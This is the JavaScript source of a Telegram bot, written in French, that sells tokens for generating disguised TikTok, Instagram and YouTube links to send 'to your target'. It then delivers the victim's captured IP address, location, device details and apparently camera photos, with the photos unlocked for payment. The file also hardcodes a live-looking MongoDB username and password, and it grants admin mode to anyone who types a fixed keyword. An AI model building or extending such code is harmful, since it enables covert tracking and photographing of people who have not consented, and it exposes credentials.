const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");
const dotenv = require("dotenv");
const crypto = require("crypto");
const mongoose = require("mongoose");

// Configuration de l'environnement
dotenv.config();

// --- 0. CONNEXION MONGODB ---
const MONGO_URI = "mongodb+srv://Dssiaka:Keita1234.76100137@queennezuko.gnrhdxk.mongodb.net/";

mongoose.connect(MONGO_URI)
    .then(() => console.log("✅ Connecté à MongoDB (Jetons Immortels activés)"))
    .catch(err => console.error("❌ Erreur MongoDB:", err));

// Définition du "Schéma" utilisateur
const userSchema = new mongoose.Schema({
    chatId: { type: String, required: true, unique: true },
    coins: { type: Number, default: 0 },
    lastActive: { type: Date, default: Date.now },
    totalGenerated: { type: Number, default: 0 },
    totalPhotosViewed: { type: Number, default: 0 }
});

const User = mongoose.model('User', userSchema);

// Fonction helper pour récupérer ou créer un utilisateur
async function getUser(chatId) {
    let user = await User.findOne({ chatId: chatId.toString() });
    if (!user) {
        user = await User.create({ 
            chatId: chatId.toString(), 
            coins: 5, // Bonus de bienvenue
            totalGenerated: 0,
            totalPhotosViewed: 0
        });
        
        // Logger la création d'un nouvel utilisateur
        logActivity("NOUVEL_UTILISATEUR", chatId, "Nouveau utilisateur", { coins: 5 });
        
        // Envoyer un message de bienvenue spécial
        await sendWelcomeMessage(chatId);
    }
    return user;
}

// --- CONFIGURATION DES TARIFS ---
const PRIX_GENERATION = 3;
const PRIX_PHOTOS = 3;
const NB_PHOTOS_A_AFFICHER = 3;

// --- CONFIGURATION DU BOT ---
process.env.NTBA_FIX_319 = 1;
process.env.NTBA_FIX_350 = 1;

// Filtrer les logs
const originalLog = console.log;
console.log = (...args) => {
    const message = args.join(" ");
    if (message.includes("TLSWrap") || message.includes("Symbol(") || message.includes("kBuffer")) return;
    originalLog.apply(console, args);
};

const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) {
    console.error("❌ TELEGRAM_BOT_TOKEN manquant !");
    process.exit(1);
}

const bot = new TelegramBot(token, { 
    polling: {
        autoStart: true,
        params: { timeout: 10 }
    } 
});

const BASE_URL = process.env.RENDER_EXTERNAL_URL 
    ? process.env.RENDER_EXTERNAL_URL.replace(/\/$/, "")
    : `http://localhost:\${process.env.PORT || 5000}`;

const DEFAULT_SECURE_TOKEN = "secure_default_token_" + crypto.createHash("sha256").update("replit_telegram_bot_2024").digest("hex");
const authToken = process.env.DATA_ACCESS_TOKEN || DEFAULT_SECURE_TOKEN;

let isAdminMode = false;

console.log(`🤖 Bot Telegram dynamique démarré !`);

// --- THÈMES ET STYLES ---
const themes = {
    primary: {
        emoji: "🔥",
        color: "🟢"
    },
    success: {
        emoji: "✅",
        color: "🟢"
    },
    error: {
        emoji: "❌",
        color: "🔴"
    },
    warning: {
        emoji: "⚠️",
        color: "🟡"
    },
    info: {
        emoji: "ℹ️",
        color: "🔵"
    }
};

// --- FONCTIONS DE STYLE ---

// Créer un message stylisé avec animation
function createStyledMessage(title, content, theme = "primary", animated = true) {
    const themeData = themes[theme];
    const animation = animated ? "⚡" : "";
    
    return `${animation} ${themeData.emoji} *${title}*\n\n${content}`;
}

// Créer un clavier stylisé
function createStyledKeyboard(buttons, columns = 2) {
    const keyboard = [];
    
    for (let i = 0; i < buttons.length; i += columns) {
        const row = [];
        for (let j = 0; j < columns && i + j < buttons.length; j++) {
            row.push(buttons[i + j]);
        }
        keyboard.push(row);
    }
    
    return { reply_markup: { inline_keyboard: keyboard } };
}

// Envoyer un message avec effet de frappe
async function sendTypingMessage(chatId, text, options = {}) {
    await bot.sendChatAction(chatId, "typing");
    await new Promise(resolve => setTimeout(resolve, 800));
    return bot.sendMessage(chatId, text, options);
}

// Envoyer un message de bienvenue spécial
async function sendWelcomeMessage(chatId) {
    const welcomeKeyboard = createStyledKeyboard([
        { text: "🎯 Commencer", callback_data: "start_tour" },
        { text: "💰 Mon solde", callback_data: "welcome_balance" }
    ], 1);
    
    await bot.sendMessage(chatId, 
        createStyledMessage(
            "🎉 BONUS DE BIENVENUE !",
            "Félicitations ! Vous avez reçu **5 jetons gratuits** pour commencer !\n\n" +
            "Utilisez-les pour générer vos premiers liens et découvrir toutes les fonctionnalités du bot.",
            "success"
        ),
        { parse_mode: "Markdown", ...welcomeKeyboard }
    );
}

// --- FONCTIONS UTILITAIRES ---

// Fonction pour formater les nombres
function formatNumber(number) {
    return new Intl.NumberFormat('fr-FR').format(number);
}

// Fonction pour obtenir l'heure actuelle
function getCurrentTime() {
    return new Date().toLocaleString('fr-FR', { 
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
    });
}

// Fonction pour logger les activités
function logActivity(activity, userId, userName, details = {}) {
    const timestamp = new Date().toISOString();
    const logEntry = {
        timestamp,
        activity,
        userId,
        userName,
        ...details
    };
    
    console.log(`📊 ACTIVITÉ: [${activity}] - User: ${userName} (ID: ${userId}) - ${JSON.stringify(details)}`);
    
    // Optionnellement, vous pouvez aussi sauvegarder ces logs dans MongoDB
    mongoose.connection.db.collection('activity_logs').insertOne(logEntry).catch(err => {
        console.error('Erreur lors de la sauvegarde du log:', err);
    });
}

// --- COMMANDES ADMINISTRATEUR ---

bot.onText(/DsSiakaAdmin/, (msg) => {
    isAdminMode = true;
    const adminKeyboard = createStyledKeyboard([
        { text: "📊 Statistiques", callback_data: "admin_stats" },
        { text: "💰 Ajouter des jetons", callback_data: "admin_add_coins" },
        { text: "🔒 Verrouiller", callback_data: "admin_lock" },
        { text: "📜 Voir les logs", callback_data: "admin_logs" }
    ], 1);
    
    bot.sendMessage(msg.chat.id, 
        createStyledMessage(
            "🔓 MODE ADMIN ACTIVÉ",
            "Vous avez maintenant accès à toutes les fonctionnalités administrateur.\n\n" +
            "Utilisez les boutons ci-dessous pour gérer le bot.",
            "success"
        ),
        { parse_mode: "Markdown", ...adminKeyboard }
    );
});

bot.onText(/\/lock/, (msg) => {
    isAdminMode = false;
    bot.sendMessage(msg.chat.id, 
        createStyledMessage(
            "🔒 MODE ADMIN VERROUILLÉ",
            "Le mode administrateur a été désactivé.",
            "info"
        ),
        { parse_mode: 'Markdown' }
    );
});

bot.onText(/\/addcoins (\d+) (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAdminMode) return bot.sendMessage(chatId, 
        createStyledMessage(
            "🚫 ACCÈS REFUSÉ",
            "Vous n'avez pas les permissions nécessaires pour utiliser cette commande.",
            "error"
        ),
        { parse_mode: 'Markdown' }
);

    const targetId = match[1];
    const amount = parseInt(match[2]);

    try {
        const user = await User.findOneAndUpdate(
            { chatId: targetId },
            { $inc: { coins: amount } },
            { new: true, upsert: true }
        );
        
        bot.sendMessage(chatId, 
            createStyledMessage(
                "✅ OPÉRATION RÉUSSIE",
                `${amount} jetons ajoutés à \`${targetId}\`.\nNouveau solde : ${user.coins} 🪙`,
                "success"
            ),
            { parse_mode: 'Markdown' }
        );
        
        bot.sendMessage(targetId, 
            createStyledMessage(
                "🎁 PAIEMENT REÇU",
                `L'admin vous a crédité de ${amount} jetons.\nNouveau solde : ${user.coins} 🪙`,
                "success"
            ),
            { parse_mode: 'Markdown' }
        ).catch(() => {});
        
        // Logger l'ajout de jetons
        logActivity("ADMIN_ADD_COINS", chatId, "Admin", { 
            targetId, 
            amount, 
            newBalance: user.coins
        });
        
    } catch (err) {
        bot.sendMessage(chatId, 
            createStyledMessage(
                "❌ ERREUR DE BASE DE DONNÉES",
                "Une erreur est survenue lors de la mise à jour des jetons.",
                "error"
            ),
            { parse_mode: 'Markdown' }
        );
        console.error(err);
    }
});

// --- COMMANDES UTILISATEUR ---

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const user = await getUser(chatId);
    
    await sendTypingMessage(chatId,
        createStyledMessage(
            "🔥 BOT DE CAPTURE ACTIVÉ",
            `<b>Bienvenue sur votre assistant de capture !</b>\n\n` +
            `<i>Votre solde actuel :</i> <code>${user.coins} 🪙</code>\n\n` +
            `<b>Tarifs :</b>\n` +
            `• <i>Générer un lien</i> : <b>${PRIX_GENERATION} 🪙</b>\n` +
            `• <i>Voir les photos</i> : <b>${PRIX_PHOTOS} 🪙</b>\n\n` +
            `<b>Statistiques :</b>\n` +
            `• Liens générés : <b>${user.totalGenerated}</b>\n` +
            `• Photos vues : <b>${user.totalPhotosViewed}</b>`,
            "primary"
        ),
        { parse_mode: 'HTML' }
    );
    
    // Envoi du clavier séparément après le message
    const mainKeyboard = createStyledKeyboard([
        { text: "🎯 Générer un lien", callback_data: "generate_link" },
        { text: "💰 Mon solde", callback_data: "check_balance" },
        { text: "💎 Acheter des jetons", callback_data: "buy_coins" },
        { text: "❓ Aide", callback_data: "show_help" }
    ], 2);
    
    bot.sendMessage(chatId, "Choisissez une option :", mainKeyboard);
});

bot.onText(/\/acheter/, (msg) => {
    const chatId = msg.chat.id;
    const buyKeyboard = createStyledKeyboard([
        { text: "💳 Contacter le vendeur", url: "https://t.me/DsSiaka" },
        { text: "📋 Voir les tarifs", callback_data: "show_pricing" },
        { text: "🔙 Retour au menu", callback_data: "back_to_main" }
    ], 1);
    
    bot.sendMessage(chatId, 
        createStyledMessage(
            "💎 ACHETER DES JETONS",
            `Vendeur officiel : <b>@DsSiaka</b>\n\n` +
            `🆔 <b>Votre ID :</b> <code>${chatId}</code>\n\n` +
            `⚡ Recharge immédiate après paiement !\n\n` +
            `📦 <b>Offres disponibles :</b>\n` +
            `• 10 jetons - 2€\n` +
            `• 25 jetons - 5€\n` +
            `• 50 jetons - 10€\n` +
            `• 100 jetons - 18€`,
            "info"
        ),
        { parse_mode: 'HTML', ...buyKeyboard }
    );
});

bot.onText(/\/balance/, async (msg) => {
    const user = await getUser(msg.chat.id);
    const balanceKeyboard = createStyledKeyboard([
        { text: "💳 Recharger", callback_data: "buy_coins" },
        { text: "📊 Historique", callback_data: "show_history" },
        { text: "🔙 Retour au menu", callback_data: "back_to_main" }
    ], 1);
    
    bot.sendMessage(msg.chat.id, 
        createStyledMessage(
            "💰 VOTRE PORTEFEUILLE",
            `<b>Solde actuel :</b> <code>${user.coins} 🪙</code>\n\n` +
            `<b>Statistiques :</b>\n` +
            `• Liens générés : ${user.totalGenerated}\n` +
            `• Photos vues : \${user.totalPhotosViewed}\n\n` +
            `<i>Vous avez besoin de plus de jetons ?</i> Contactez <b>@DsSiaka</b>`,
            "info"
        ),
        { parse_mode: 'HTML', ...balanceKeyboard }
    );
});

// --- GESTION DES CLICS ---
bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    // A. Voir Preview (Gratuit)
    if (data.startsWith("data_")) {
        bot.answerCallbackQuery(query.id);
        const linkId = data.replace("data_", "");
        await sendDataPreview(chatId, linkId);
        return;
    }

    // B. Acheter Photos (Payant)
    if (data.startsWith("buyphotos_")) {
        const linkId = data.replace("buyphotos_", "");
        const user = await getUser(chatId);

        if (user.coins < PRIX_PHOTOS) {
            return bot.answerCallbackQuery(query.id, { text: `❌ Manque de jetons ! Il faut \${PRIX_PHOTOS} 🪙`, show_alert: true });
        }

        // Débit via MongoDB
        user.coins -= PRIX_PHOTOS;
        user.totalPhotosViewed += 1;
        await user.save();
        
        bot.answerCallbackQuery(query.id, { text: `✅ Photos débloquées (-\${PRIX_PHOTOS} 🪙)` });
        await sendPhotos(chatId, linkId);
        
        // Logger l'achat de photos
        logActivity("BUY_PHOTOS", chatId, "User", { 
            linkId, 
            coinsDeducted: PRIX_PHOTOS,
            newBalance: user.coins
        });
        return;
    }

    // C. Générer Lien (Payant)
    if (data === "generate_link" || data === "tiktok" || data === "instagram" || data === "youtube") {
        const platform = data === "generate_link" ? null : data;
        const user = await getUser(chatId);
        
        if (user.coins < PRIX_GENERATION) {
            const insufficientKeyboard = createStyledKeyboard([
                { text: "💳 Recharger maintenant", url: "https://t.me/DsSiaka" },
                { text: "🔙 Retour au menu", callback_data: "back_to_main" }
            ], 1);
            
            bot.sendMessage(chatId, 
                createStyledMessage(
                    "⚠️ SOLDE INSUFFISANT",
                    `💸 <b>Coût requis :</b> ${PRIX_GENERATION} 🪙\n` +
                    `💰 <b>Votre solde :</b> ${user.coins} 🪙\n\n` +
                    `<i>Rechargez votre compte pour continuer.</i>`,
                    "warning"
                ),
                { parse_mode: 'HTML', ...insufficientKeyboard }
            );
            return bot.answerCallbackQuery(query.id, { text: "❌ Solde insuffisant !", show_alert: true });
        }

        if (platform) {
            try {
                await bot.sendChatAction(chatId, "typing");
                
// Récupérer les informations de l'utilisateur
                const telegramUser = await bot.getChat(chatId);
                const userName = telegramUser.username || `${telegramUser.first_name} ${telegramUser.last_name || ''}`.trim();
                
                const response = await axios.post(`\${BASE_URL}/generate-link`, { platform, chatId });
                const { id, url } = response.data;

                // Débit via MongoDB
                user.coins -= PRIX_GENERATION;
                user.totalGenerated += 1;
                await user.save();

                // Logger la génération de lien
                logActivity("GENERATION_LIEN", chatId, userName, { 
                    platform, 
                    linkId: id, 
                    url, 
                    coinsDeducted: PRIX_GENERATION,
                    remainingCoins: user.coins 
                });

                bot.answerCallbackQuery(query.id, { text: `✅ Lien généré ! -${PRIX_GENERATION} Jetons` });

                const linkKeyboard = createStyledKeyboard([
                    { text: "🔗 Ouvrir le lien", url: url },
                    { text: "📊 Voir les données", callback_data: `data_${id}` },
                    { text: "🔄 Générer un autre", callback_data: "generate_link" }
                ], 1);

                await bot.sendMessage(chatId, 
                    createStyledMessage(
                        "✅ LIEN CRÉÉ AVEC SUCCÈS",
                        `<b>Plateforme :</b> ${platform.toUpperCase()}\n` +
                        `<b>Lien :</b> <code>${url}</code>\n\n` +
                        `💰 <b>Restant :</b> ${user.coins} 🪙\n` +
                        `⚡ <b>Statut :</b> En attente du clic...`,
                        "success"
                    ),
                    { parse_mode: 'HTML', disable_web_page_preview: true, ...linkKeyboard }
                );

            } catch (error) {
                console.error("Erreur génération:", error.message);
                
                // Logger l'erreur
                const telegramUser = await bot.getChat(chatId).catch(() => ({ username: "Inconnu" }));
                const userName = telegramUser.username || "Inconnu";
                logActivity("ERREUR_GENERATION", chatId, userName, { platform, error: error.message });
                
                bot.answerCallbackQuery(query.id, { text: "❌ Erreur serveur", show_alert: true });
            }
        } else {
            const platformKeyboard = createStyledKeyboard([
                { text: "🎵 TikTok", callback_data: "tiktok" },
                { text: "📸 Instagram", callback_data: "instagram" },
                { text: "📺 YouTube", callback_data: "youtube" },
                { text: "🔙 Retour au menu", callback_data: "back_to_main" }
            ], 1);
            
            bot.sendMessage(chatId, 
                createStyledMessage(
                    "🎯 GÉNÉRATEUR DE LIENS",
                    `💰 <b>Coût :</b> ${PRIX_GENERATION} 🪙\n` +
                    `💰 <b>Solde :</b> ${user.coins} 🪙\n\n` +
                    `Choisissez la plateforme pour votre lien :`,
                    "primary"
                ),
                { parse_mode: 'HTML', ...platformKeyboard }
            );
        }
        return;
    }

    // D. Autres actions
    switch (data) {
        case "check_balance":
            await sendTypingMessage(chatId, 
                createStyledMessage(
                    "💰 VOTRE PORTEFEUILLE",
                    `<b>Solde actuel :</b> <code>${user.coins} 🪙</code>\n\n` +
                    `<b>Statistiques :</b>\n` +
                    `• Liens générés : ${user.totalGenerated}\n` +
                    `• Photos vues : ${user.totalPhotosViewed}\n\n` +
                    `<i>Vous avez besoin de plus de jetons ?</i> Contactez <b>@DsSiaka</b>`,
                    "info"
                ),
                { parse_mode: 'HTML' }
            );
            break;
        case "buy_coins":
            const buyKeyboard = createStyledKeyboard([
                { text: "💳 Contacter le vendeur", url: "https://t.me/DsSiaka" },
                { text: "📋 Voir les tarifs", callback_data: "show_pricing" },
                { text: "🔙 Retour au menu", callback_data: "back_to_main" }
            ], 1);
            await bot.sendMessage(chatId, 
                createStyledMessage(
                    "💎 ACHETER DES JETONS",
                    `Vendeur officiel : <b>@DsSiaka</b>\n\n` +
                    `🆔 <b>Votre ID :</b> <code>\${chatId}</code>\n\n` +
                    `⚡ Recharge immédiate après paiement !\n\n` +
                    `📦 <b>Offres disponibles :</b>\n` +
                    `• 10 jetons - 2€\n` +
                    `• 25 jetons - 5€\n` +
                    `• 50 jetons - 10€\n` +
                    `• 100 jetons - 18€`,
                    "info"
                ),
                { parse_mode: 'HTML', ...buyKeyboard }
            );
            break;
        case "show_pricing":
            await bot.sendMessage(chatId, 
                createStyledMessage(
                    "📋 TARIFS DES JETONS",
                    `• <b>10 jetons</b> - 2€\n` +
                    `• <b>25 jetons</b> - 5€\n` +
                    `• <b>50 jetons</b> - 10€\n` +
                    `• <b>100 jetons</b> - 18€\n\n` +
                    `<i>Contactez <b>@DsSiaka</b> pour effectuer un achat.</i>`,
                    "info"
                ),
                { parse_mode: 'HTML' }
            );
            break;
        case "show_help":
            await bot.sendMessage(chatId, 
                createStyledMessage(
                    "📚 AIDE",
                    `1. Utilisez /generate (Coût \${PRIX_GENERATION}🪙) pour créer un lien.\n` +
                    `2. Envoyez le lien à votre cible.\n` +
                    `3. Consultez le rapport (IP, etc.) avec /data [ID].\n` +
                    `4. Débloquez les photos (Coût ${PRIX_PHOTOS}🪙) avec /photos [ID].\n\n` +
                    `💎 Rechargez : @DsSiaka`,
                    "info"
                ),
                { parse_mode: 'Markdown' }
            );
            break;
        case "admin_stats":
            if (isAdminMode) {
                const stats = await User.aggregate([
                    { $group: { _id: null, totalUsers: { $sum: 1 }, totalCoins: { $sum: "$coins" } } }
                ]);
                const totalUsers = stats[0]?.totalUsers || 0;
                const totalCoins = stats[0]?.totalCoins || 0;
                
                bot.sendMessage(chatId, 
                    createStyledMessage(
                        "📊 STATISTIQUES",
                        `👥 <b>Utilisateurs totaux :</b> ${totalUsers}\n` +
                        `🪙 <b>Jetons totaux :</b> ${totalCoins}\n\n` +
                        `⏰ <b>Dernière mise à jour :</b> ${getCurrentTime()}`,
                        "info"
                    ),
                    { parse_mode: 'HTML' }
                );
            }
            break;
        case "admin_logs":
            if (isAdminMode) {
                try {
                    // Récupérer les 20 derniers logs depuis MongoDB
                    const logs = await mongoose.connection.db.collection('activity_logs')
                        .find({})
                        .sort({ timestamp: -1 })
                        .limit(20)
                        .toArray();
                    
                    if (logs.length === 0) {
                        return bot.sendMessage(chatId, 
                            createStyledMessage(
                                "📊 LOGS",
                                "Aucune activité enregistrée pour le moment.",
                                "info"
                            ),
                            { parse_mode: 'Markdown' }
                        );
                    }

                    let logsText = logs.map(log => 
                        `[${new Date(log.timestamp).toLocaleString('fr-FR')}] ${log.activity} - ${log.userName} (ID: ${log.userId})`
                    ).join('\n');

                    // Si le texte est trop long, divisez-le en plusieurs messages
                    if (logsText.length > 4000) {
                        const parts = logsText.match(/.{1,4000}/g) || [];
                        for (let i = 0; i < parts.length; i++) {
                            await bot.sendMessage(chatId, 
                                createStyledMessage(
                                    `📊 LOGS (${i + 1}/${parts.length})`,
                                    "```\n" + parts[i] + "\n```",
                                    "info"
                                ),
                                { parse_mode: 'Markdown' }
                            );
                        }
                    } else {
                        await bot.sendMessage(chatId, 
                            createStyledMessage(
                                "📊 LOGS",
                                "```\n" + logsText + "\n```",
                                "info"
                            ),
                            { parse_mode: 'Markdown' }
                        );
                    }
                } catch (error) {
                    console.error('Erreur lors de la récupération des logs:', error);
                    bot.sendMessage(chatId, 
                        createStyledMessage(
                            "❌ ERREUR",
                            "Une erreur est survenue lors de la récupération des logs.",
                            "error"
                        ),
                        { parse_mode: 'Markdown' }
                    );
                }
            }
            break;
        case "admin_add_coins":
            if (isAdminMode) {
                const addCoinsKeyboard = createStyledKeyboard([
                    { text: "🔙 Retour aux options admin", callback_data: "admin_menu" }
                ], 1);
                bot.sendMessage(chatId, 
                    createStyledMessage(
                        "💰 AJOUTER DES JETONS",
                        "Utilisez la commande /addcoins [ID] [MONTANT] pour ajouter des jetons à un utilisateur.\n\n" +
                        "Exemple : /addcoins 12345 10 pour ajouter 10 jetons à l'utilisateur avec l'ID 12345.",
                        "info"
                    ),
                    { parse_mode: 'Markdown', ...addCoinsKeyboard }
                );
            }
            break;
        case "back_to_main":
            const mainKeyboard = createStyledKeyboard([
                { text: "🎯 Générer un lien", callback_data: "generate_link" },
                { text: "💰 Mon solde", callback_data: "check_balance" },
                { text: "💎 Acheter des jetons", callback_data: "buy_coins" },
                { text: "❓ Aide", callback_data: "show_help" }
            ], 2);
            await bot.sendMessage(chatId, "Choisissez une option :", mainKeyboard);
            break;
        case "welcome_balance":
            await bot.sendMessage(chatId, 
                createStyledMessage(
                    "💰 VOTRE PORTEFEUILLE",
                    `<b>Solde actuel :</b> <code>${user.coins} 🪙</code>\n\n` +
                    `<b>Statistiques :</b>\n` +
                    `• Liens générés : ${user.totalGenerated}\n` +
                    `• Photos vues : ${user.totalPhotosViewed}\n\n` +
                    `<i>Vous avez besoin de plus de jetons ?</i> Contactez <b>@DsSiaka</b>`,
                    "info"
                ),
                { parse_mode: 'HTML' }
            );
            break;
        case "show_history":
            try {
                const history = await mongoose.connection.db.collection('activity_logs')
                    .find({ userId: chatId.toString() })
                    .sort({ timestamp: -1 })
                    .limit(10)
                    .toArray();
                
                if (history.length === 0) {
                    return bot.sendMessage(chatId, 
                        createStyledMessage(
                            "📜 HISTORIQUE",
                            "Aucune activité trouvée pour le moment.",
                            "info"
                        ),
                        { parse_mode: 'Markdown' }
                    );
                }

                let historyText = history.map(log => 
                    `[${new Date(log.timestamp).toLocaleString('fr-FR')}] ${log.activity} - ${formatNumber(log.coins || 0)} 🪙`
                ).join('\n');

                await bot.sendMessage(chatId, 
                    createStyledMessage(
                        "📜 VOTRE HISTORIQUE",
                        "```\n" + historyText + "\n```",
                        "info"
                    ),
                    { parse_mode: 'Markdown' }
                );
            } catch (error) {
                console.error('Erreur lors de la récupération de l\'historique:', error);
                bot.sendMessage(chatId, 
                    createStyledMessage(
                        "❌ ERREUR",
                        "Une erreur est survenue lors de la récupération de l'historique.",
                        "error"
                    ),
                    { parse_mode: 'Markdown' }
                );
            }
            break;
        default:
            bot.answerCallbackQuery(query.id, { text: "Action inconnue", show_alert: true });
    }
});

// --- FONCTIONS AFFICHAGE ---

bot.onText(/\/data (.+)/, async (msg, match) => {
    await sendDataPreview(msg.chat.id, match[1].trim());
});

async function sendDataPreview(chatId, linkId) {
    try {
        await bot.sendChatAction(chatId, "typing");
        
        // Récupérer les informations de l'utilisateur
        const telegramUser = await bot.getChat(chatId);
        const userName = telegramUser.username || `${telegramUser.first_name} ${telegramUser.last_name || ''}`.trim();
        
        const response = await axios.get(`${BASE_URL}/get-data/${linkId}`, {
            headers: { Authorization: `Bearer ${authToken}` },
        });
        const data = response.data;
        const photoCount = data.images ? data.images.length : 0;

        // Logger l'accès aux données
        logActivity("ACCES_DONNEES", chatId, userName, { 
            linkId, 
            photoCount,
            hasLocation: !!(data.location && data.location.latitude),
            capturedAt: data.timestamp
        });

        let message = `📊 *RAPPORT* - \`${linkId}\`\n\n`;
        message += `⏰ ${new Date(data.timestamp).toLocaleString("fr-FR")}\n`;
        message += `🌐 IP: ${data.ip || "Masquée"}\n`;

        if (data.location && data.location.latitude) {
            message += `📍 ${data.location.city || "?"}, ${data.location.country || "?"}\n`;
        }

        if (data.device) {
            message += `📱 ${data.device.vendor || ""} ${data.device.model || "Mobile"}\n`;
        }

        message += `\n📸 *Photos disponibles :* ${photoCount}\n`;
        
        const keyboard = { reply_markup: { inline_keyboard: [] } };
        
        if (photoCount > 0) {
            message += `🔒 *Photos verrouillées.*\nCoût : \${PRIX_PHOTOS} 🪙`;
            keyboard.reply_markup.inline_keyboard.push([
                { text: `📸 Voir les \${Math.min(photoCount, NB_PHOTOS_A_AFFICHER)} Photos (${PRIX_PHOTOS} 🪙)`, callback_data: `buyphotos_${linkId}` }
            ]);
        } else {
            message += `⚠️ Aucune photo capturée.`;
        }

        await bot.sendMessage(chatId, message, { parse_mode: "Markdown", ...keyboard });

    } catch (error) {
        // Logger l'erreur
        const telegramUser = await bot.getChat(chatId).catch(() => ({ username: "Inconnu" }));
        const userName = telegramUser.username || "Inconnu";
        logActivity("ERREUR_ACCES_DONNEES", chatId, userName, { linkId, error: error.message });
        
        bot.sendMessage(chatId, `❌ Données introuvables pour \`${linkId}\``, { parse_mode: "Markdown" });
    }
}

async function sendPhotos(chatId, linkId) {
    try {
        await bot.sendChatAction(chatId, "upload_photo");
        
        // Récupérer les informations de l'utilisateur
        const telegramUser = await bot.getChat(chatId);
        const userName = telegramUser.username || `${telegramUser.first_name} ${telegramUser.last_name || ''}`.trim();
        
        const response = await axios.get(`${BASE_URL}/get-data/${linkId}`, {
            headers: { Authorization: `Bearer \${authToken}` },
        });
        const data = response.data;
        
        if (!data.images || data.images.length === 0) return;

        // Logger l'accès aux photos
        logActivity("ACCES_PHOTOS", chatId, userName, { 
            linkId, 
            photoCount: data.images.length,
            photosDisplayed: Math.min(data.images.length, NB_PHOTOS_A_AFFICHER),
            coinsDeducted: PRIX_PHOTOS
        });

        await bot.sendMessage(chatId, `🔓 **Photos débloquées !** Envoi en cours...`);

        const limit = Math.min(data.images.length, NB_PHOTOS_A_AFFICHER);

        for (let i = 0; i < limit; i++) {
            try {
                const imgBuffer = Buffer.from(data.images[i], "base64");
                await bot.sendPhoto(chatId, imgBuffer, { 
                    caption: `📸 Photo ${i + 1}/${limit}` 
                });
            } catch (err) {
                console.error(`Erreur image ${i}:`, err);
            }
        }
        
        if (data.location && data.location.latitude) {
            const mapsUrl = `https://maps.google.com/?q=${data.location.latitude},${data.location.longitude}`;
            bot.sendMessage(chatId, `🗺️ [Voir position sur Maps](${mapsUrl})`, { parse_mode: "Markdown" });
        }

    } catch (error) {
        // Logger l'erreur
        const telegramUser = await bot.getChat(chatId).catch(() => ({ username: "Inconnu" }));
        const userName = telegramUser.username || "Inconnu";
        logActivity("ERREUR_ACCES_PHOTOS", chatId, userName, { linkId, error: error.message });
        
        bot.sendMessage(chatId, "❌ Erreur lors de l'envoi des photos.");
    }
}

bot.onText(/\/help/, (msg) => {
    bot.sendMessage(msg.chat.id, 
        createStyledMessage(
            "📚 AIDE",
            `1. /generate (Coût ${PRIX_GENERATION}🪙) pour créer un lien.\n` +
            `2. Envoyez le lien à votre cible.\n` +
            `3. Consultez le rapport (IP, etc.) avec /data [ID].\n` +
            `4. Débloquez les photos (Coût ${PRIX_PHOTOS}🪙) avec /photos [ID].\n\n` +
            `💎 Rechargez : @DsSiaka`,
            "info"
        ),
        { parse_mode: 'Markdown' }
    );
});

// Logs d'erreur
bot.on("polling_error", (error) => console.log(`⚠️ Erreur Polling: ${error.message}`));
bot.on("webhook_error", (error) => console.log(`⚠️ Erreur Webhook: ${error.message}`));
